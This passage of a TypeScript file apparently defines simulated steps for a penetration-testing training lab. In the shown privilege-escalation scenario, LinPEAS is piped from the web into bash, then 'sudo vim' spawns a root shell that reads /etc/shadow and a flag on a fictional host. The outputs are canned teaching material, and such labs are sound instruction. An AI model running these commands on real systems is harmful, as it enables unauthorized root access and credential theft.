      detail: "First, always know who you are. whoami and id will tell you your username and group memberships.",
      hint: "Try: whoami\n  Or: id",
      validate: (i) => matchCmd(i, ["whoami", "id", "who am i"]),
      execute: () => [
        ...lines(`www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)`),
        blank(),
        info("Low-privilege web server user. No sudo, no interesting groups. Need to escalate."),
      ],
    },
    {
      id: "linpeas",
      instruction: "Run LinPEAS for automated enumeration",
      detail: "LinPEAS scans the system for privilege escalation vectors: SUID files, writable configs, sudo rules, cron jobs, kernel exploits, and more.",
      hint: "Try: curl -L https://linpeas.sh | bash\n  Or: ./linpeas.sh",
      validate: (i) => matchCmd(i, ["curl -l https://linpeas", "curl https://linpeas", "curl -l http://linpeas", "./linpeas", "bash linpeas", "sh linpeas"]),
      execute: () => [
        sys("[*] Downloading and running LinPEAS..."),
        blank(),
        ...lines(`╔══════════╣ Sudo version
╚ Sudo version 1.8.21p2

╔══════════╣ SUID - Check easy privesc
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root  /usr/bin/find
-rwsr-xr-x 1 root root  /usr/bin/vim
-rwsr-xr-x 1 root root  /usr/bin/python3.6
-rwsr-xr-x 1 root root  /usr/bin/passwd

╔══════════╣ Checking Sudo
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on megacorp-internal:
    env_reset, mail_badpass

User www-data may run the following commands on megacorp-internal:
    (ALL : ALL) NOPASSWD: /usr/bin/vim`),
        blank(),
        warn("[!] www-data can run vim as root with NO PASSWORD!"),
        warn("[!] python3 SUID — can be exploited too"),
        ok("[+] Multiple escalation paths found. Use sudo vim."),
      ],
    },
    {
      id: "sudo-l",
      instruction: "Verify sudo privileges",
      detail: "Confirm what sudo commands www-data can run with sudo -l.",
      hint: "Try: sudo -l",
      validate: (i) => matchCmd(i, ["sudo -l"]),
      execute: () => [
        ...lines(`Matching Defaults entries for www-data on megacorp-internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on megacorp-internal:
    (ALL : ALL) NOPASSWD: /usr/bin/vim`),
        blank(),
        ok("[+] Confirmed: sudo vim with no password. This is a GTFOBin exploit."),
        info("GTFOBins shows vim can spawn a shell: sudo vim -c ':!/bin/sh'"),
      ],
    },
    {
      id: "exploit-vim",
      instruction: "Escalate to root using sudo vim",
      detail: "vim can execute shell commands with :!cmd. Run sudo vim and use the ex command to spawn a root shell. This is a classic GTFOBin.",
      hint: "Try: sudo vim -c ':!/bin/bash'",
      validate: (i) => matchCmd(i, ["sudo vim", "sudo /usr/bin/vim"]),
      execute: () => [
        sys("[*] Opening vim as root..."),
        sys("[*] Running :!/bin/bash via vim ex command..."),
        blank(),
        ...lines(`root@megacorp-internal:/var/www/html# whoami
root
root@megacorp-internal:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)`),
        blank(),
        ok("[+] ROOT SHELL ACHIEVED!"),
        blank(),
        ...lines(`root@megacorp-internal:/var/www/html# cat /etc/shadow | head -5
root:$6$aaaaaa$HASH_HERE:18000:0:99999:7:::
daemon:*:17737:0:99999:7:::
www-data:$6$bbbbbb$HASH_HERE:18500:0:99999:7:::

root@megacorp-internal:/var/www/html# cat /root/flag.txt
FLAG{pr1v3sc_m4st3r_v1m_suid_ex3c}`),
        blank(),
        warn("[+] Flag captured: FLAG{pr1v3sc_m4st3r_v1m_suid_ex3c}"),
        ok("[+] Full system compromise via sudo misconfiguration. Document and report."),
      ],
    },
  ],
};

// ─── Registry ─────────────────────────────────────────────────────────────────

export const LAB_SCENARIOS: Record<number, LabScenario> = {
  1: osintScenario,
  2: dnsScenario,
  4: nmapScenario,
  6: sqliScenario,
  7: hashcatScenario,
  8: msfScenario,
  9: privescScenario,
};

export function getScenarioForLesson(lessonId: number): LabScenario | null {
  return LAB_SCENARIOS[lessonId] ?? null;
}
